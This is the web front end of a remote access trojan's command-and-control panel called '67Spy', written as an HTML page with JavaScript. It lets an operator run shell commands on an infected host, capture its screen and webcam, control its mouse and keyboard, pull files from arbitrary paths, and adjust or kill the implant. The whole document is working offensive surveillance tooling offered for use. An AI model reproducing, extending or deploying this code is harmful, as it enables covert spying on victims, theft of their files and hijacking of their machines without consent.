<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>67Spy — Client</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><a href="/" class="nav-home">67SPY</a></div>
  <div class="nav-links">
    <a href="/" class="nav-tab">Dashboard</a>
    <span class="nav-tab-sep">›</span>
    <span class="nav-tab active" id="nav-client-name">Client</span>
  </div>
  <div class="nav-right">
    <span id="status-dot" class="dot dot-red"></span>
    <span id="status-text" class="muted" style="font-size:13px">connecting…</span>
    <a href="/logout" class="nav-link">Logout</a>
  </div>
</nav>

<div class="page-wrap">
  <div class="client-header" id="client-header">
    <div class="client-title">
      <h2 id="c-hostname">Loading…</h2>
      <span class="mono muted" id="c-uuid">{{ cid }}</span>
    </div>
    <div class="client-meta" id="c-meta"></div>
  </div>

  <!-- Tabs -->
  <div class="tabs">
    <button class="tab active" data-tab="shell">Shell</button>
    <button class="tab" data-tab="screenshot">Screenshot</button>
    <button class="tab" data-tab="webcam">Webcam</button>
    <button class="tab" data-tab="remote">Remote Desktop</button>
    <button class="tab" data-tab="files">Files</button>
    <button class="tab" data-tab="info">Info</button>
  </div>

  <!-- Shell -->
  <div class="tab-content active" id="tab-shell">
    <div class="output-wrap">
      <div id="shell-output" class="output-box">
        <span class="muted">— shell ready —</span>
      </div>
    </div>
    <div class="input-row">
      <span class="mono muted prompt">$ </span>
      <input type="text" id="shell-input" class="cmd-input" placeholder="Enter command…" autocomplete="off">
      <button class="btn-primary" onclick="sendShell()">Run</button>
    </div>
  </div>

  <!-- Screenshot -->
  <div class="tab-content" id="tab-screenshot">
    <div class="action-bar">
      <button class="btn-primary" onclick="takeScreenshot()">📷 Capture Screen</button>
      <span id="ss-status" class="muted small"></span>
    </div>
    <div class="img-wrap">
      <img id="ss-img" class="capture-img hidden" alt="screenshot">
    </div>
  </div>

  <!-- Webcam -->
  <div class="tab-content" id="tab-webcam">
    <div class="action-bar">
      <button class="btn-primary" onclick="takeWebcam()">📸 Capture Webcam</button>
      <span id="wc-status" class="muted small"></span>
    </div>
    <div class="img-wrap">
      <img id="wc-img" class="capture-img hidden" alt="webcam">
    </div>
  </div>

  <!-- Remote Desktop -->
  <div class="tab-content" id="tab-remote">
    <div class="action-bar">
      <button class="btn-primary" id="rd-toggle" onclick="toggleRemote()">▶ Start Stream</button>
      <span class="muted small">Click on image to move mouse · Type to send keys · Right-click for right button</span>
    </div>
    <div class="img-wrap" id="rd-wrap">
      <canvas id="rd-canvas" class="rd-canvas" tabindex="0"></canvas>
      <div id="rd-placeholder" class="rd-placeholder">Start stream to view remote desktop</div>
    </div>
  </div>

  <!-- Files -->
  <div class="tab-content" id="tab-files">
    <div class="action-bar">
      <button class="btn-primary" onclick="refreshFiles()">↻ Refresh</button>
    </div>
    <div id="files-list" class="files-list">
      <span class="muted">No uploads yet.</span>
    </div>
    <div class="upload-row">
      <input type="text" id="ul-remote" class="cmd-input" placeholder="Remote path (C:\\path\\to\\file.txt)" style="flex:2">
      <button class="btn-sm" onclick="queueUpload()">↑ Pull from Client</button>
    </div>
  </div>

  <!-- Info -->
  <div class="tab-content" id="tab-info">
    <table class="info-table" id="info-table">
      <tbody></tbody>
    </table>
    <div style="margin-top:20px">
      <button class="btn-sm danger" onclick="killClient()">☠ Kill Implant</button>
      <button class="btn-sm" style="margin-left:8px" onclick="adjustSleep()">⏱ Adjust Sleep</button>
    </div>
  </div>
</div>

<script>
const CID   = '{{ cid }}';
const TOKEN = '{{ session.token }}';
let pollTimer   = null;
let shellSince  = 0;
let rdStreaming = false;
let rdTimer     = null;

// ── tab switching ─────────────────────────────────────────────────────────
document.querySelectorAll('.tab').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
  });
});

// ── api helpers ──────────────────────────────────────────────────────────
async function api(method, path, body) {
  const opts = {method, headers: {'Authorization': 'Bearer ' + TOKEN}};
  if (body) { opts.headers['Content-Type'] = 'application/json'; opts.body = JSON.stringify(body); }
  const r = await fetch(path, opts);
  return r.ok ? r.json() : null;
}

async function queueTask(task) {
  return api('POST', '/op/task', {uuid: CID, task});
}

function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function reltime(ts) {
  const d = Math.floor(Date.now()/1000 - ts);
  if (d < 60) return d+'s ago'; if (d < 3600) return Math.floor(d/60)+'m ago';
  return Math.floor(d/3600)+'h ago';
}

// ── load client info ─────────────────────────────────────────────────────
async function loadInfo() {
  const c = await api('GET', '/op/info/' + CID);
  if (!c) return;
  const hn = c.hostname || CID.substring(0,8);
  document.getElementById('c-hostname').textContent = hn;
  document.getElementById('nav-client-name').textContent = hn;
  document.getElementById('c-meta').innerHTML =
    `<span>${esc(c.username||'?')}</span> · <span>${esc(c.ip||'?')}</span> · <span>${esc(c.os_info||'?')}</span>`;
  const now = Date.now()/1000;
  const online = (now - c.last_seen) < 60;
  document.getElementById('status-dot').className = 'dot ' + (online ? 'dot-green' : 'dot-red');
  document.getElementById('status-text').textContent = online ? 'Online' : 'Last seen ' + reltime(c.last_seen);
  // info table
  const rows = [
    ['UUID', c.uuid], ['Hostname', c.hostname], ['Username', c.username],
    ['IP Address', c.ip], ['OS', c.os_info],
    ['First Seen', new Date(c.first_seen*1000).toLocaleString()],
    ['Last Seen', new Date(c.last_seen*1000).toLocaleString()],
    ['Protocol', c.proto_ver]
  ];
  document.querySelector('#info-table tbody').innerHTML =
    rows.map(([k,v]) => `<tr><td class="info-key">${k}</td><td class="mono">${esc(v||'')}</td></tr>`).join('');
}

// ── shell ────────────────────────────────────────────────────────────────
document.getElementById('shell-input').addEventListener('keydown', e => {
  if (e.key === 'Enter') sendShell();
});

async function sendShell() {
  const input = document.getElementById('shell-input');
  const cmd = input.value.trim();
  if (!cmd) return;
  input.value = '';
  appendShell(`<span class="prompt">$ ${esc(cmd)}</span>`);
  await queueTask(`type=shell\ncmd=${cmd}\n`);
  setTimeout(pollResults, 500);
}

function appendShell(html) {
  const box = document.getElementById('shell-output');
  box.innerHTML += '<div>' + html + '</div>';
  box.scrollTop = box.scrollHeight;
}

async function pollResults() {
  const data = await api('GET', `/op/results/${CID}?since=${shellSince}`);
  if (!data || !data.length) return;
  data.reverse().forEach(r => {
    if (r.timestamp <= shellSince) return;
    shellSince = Math.max(shellSince, r.timestamp);
    if (r.result_type === 'shell') {
      appendShell(`<span class="output-text">${esc(r.output)}</span>`);
    }
  });
}

// ── screenshot ────────────────────────────────────────────────────────────
async function takeScreenshot() {
  const status = document.getElementById('ss-status');
  status.textContent = 'Queuing…';
  await queueTask('type=screenshot\n');
  status.textContent = 'Waiting for capture…';
  await pollForImage('ss-img', 'screenshot.png', status);
}

async function pollForImage(imgId, filename, statusEl) {
  const before = Date.now()/1000;
  for (let i = 0; i < 30; i++) {
    await sleep(1000);
    const files = await api('GET', `/op/uploads/${CID}`);
    if (!files) continue;
    const f = files.find(x => x.name === filename && x.mtime > before - 2);
    if (f) {
      const img = document.getElementById(imgId);
      img.src = `/op/uploads/${CID}/${filename}?t=${Date.now()}`;
      img.classList.remove('hidden');
      if (statusEl) statusEl.textContent = 'Captured ' + new Date().toLocaleTimeString();
      return;
    }
  }
  if (statusEl) statusEl.textContent = 'Timeout — is the implant running?';
}

// ── webcam ────────────────────────────────────────────────────────────────
async function takeWebcam() {
  const status = document.getElementById('wc-status');
  status.textContent = 'Queuing…';
  await queueTask('type=webcam\n');
  status.textContent = 'Waiting for capture…';
  await pollForImage('wc-img', 'webcam.png', status);
}

// ── remote desktop ────────────────────────────────────────────────────────
const canvas = document.getElementById('rd-canvas');
const ctx    = canvas.getContext('2d');

function toggleRemote() {
  rdStreaming = !rdStreaming;
  document.getElementById('rd-toggle').textContent = rdStreaming ? '■ Stop Stream' : '▶ Start Stream';
  document.getElementById('rd-placeholder').style.display = rdStreaming ? 'none' : 'flex';
  canvas.style.display = rdStreaming ? 'block' : 'none';
  if (rdStreaming) {
    rdStream();
  } else {
    clearTimeout(rdTimer);
  }
}

async function rdStream() {
  if (!rdStreaming) return;
  await queueTask('type=screenshot\n');
  await sleep(800);
  const files = await api('GET', `/op/uploads/${CID}`);
  if (files) {
    const f = files.find(x => x.name === 'screenshot.png');
    if (f) {
      const img = new Image();
      img.onload = () => {
        canvas.width  = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
      };
      img.src = `/op/uploads/${CID}/screenshot.png?t=${Date.now()}`;
    }
  }
  rdTimer = setTimeout(rdStream, 2000);
}

canvas.addEventListener('click', e => sendMouseClick(e, 'lclick'));
canvas.addEventListener('contextmenu', e => { e.preventDefault(); sendMouseClick(e, 'rclick'); });
canvas.addEventListener('dblclick', e => sendMouseClick(e, 'dblclick'));

canvas.addEventListener('keydown', e => {
  e.preventDefault();
  const vk = keyToVK(e.key, e.code);
  if (vk) queueTask(`type=keypress\nvk=${vk}\n`);
  if (e.key.length === 1) queueTask(`type=typetext\ntext=${e.key}\n`);
});

function sendMouseClick(e, btn) {
  const rect = canvas.getBoundingClientRect();
  const x = Math.round((e.clientX - rect.left) * (canvas.width  / rect.width));
  const y = Math.round((e.clientY - rect.top)  * (canvas.height / rect.height));
  queueTask(`type=${btn}\nx=${x}\ny=${y}\n`);
}

function keyToVK(key, code) {
  const map = {
    'Enter':0x0D, 'Backspace':0x08, 'Tab':0x09, 'Escape':0x1B, 'Delete':0x2E,
    'ArrowLeft':0x25, 'ArrowUp':0x26, 'ArrowRight':0x27, 'ArrowDown':0x28,
    'Home':0x24, 'End':0x23, 'PageUp':0x21, 'PageDown':0x22,
    'F1':0x70,'F2':0x71,'F3':0x72,'F4':0x73,'F5':0x74,'F6':0x75,
    'F7':0x76,'F8':0x77,'F9':0x78,'F10':0x79,'F11':0x7A,'F12':0x7B,
    'Control':0x11, 'Shift':0x10, 'Alt':0x12
  };
  return map[key] || null;
}

// ── files ────────────────────────────────────────────────────────────────
async function refreshFiles() {
  const files = await api('GET', `/op/uploads/${CID}`);
  const div = document.getElementById('files-list');
  if (!files || !files.length) { div.innerHTML = '<span class="muted">No uploads yet.</span>'; return; }
  div.innerHTML = files.map(f => `
    <div class="file-row">
      <span class="mono">${esc(f.name)}</span>
      <span class="muted small">${(f.size/1024).toFixed(1)} KB</span>
      <a href="/op/uploads/${CID}/${encodeURIComponent(f.name)}" class="action-link" target="_blank">Download</a>
    </div>`).join('');
}

async function queueUpload() {
  const path = document.getElementById('ul-remote').value.trim();
  if (!path) return;
  const name = path.split('\\').pop().split('/').pop();
  await queueTask(`type=upload\npath=${path}\nname=${name}\n`);
  setTimeout(refreshFiles, 3000);
}

// ── info tab actions ───────────────────────────────────────────────────────
async function killClient() {
  if (!confirm('Kill implant process?')) return;
  await queueTask('type=die\n');
}

async function adjustSleep() {
  const ms = prompt('New beacon interval (ms):', '5000');
  if (!ms || isNaN(ms)) return;
  const v = Math.max(100, Math.min(parseInt(ms), 86400000));
  await queueTask(`type=sleep\nms=${v}\n`);
}

// ── helpers ────────────────────────────────────────────────────────────────
const sleep = ms => new Promise(r => setTimeout(r, ms));

// ── init ──────────────────────────────────────────────────────────────────
loadInfo();
setInterval(loadInfo, 8000);
setInterval(pollResults, 2000);
</script>
</body>
</html>
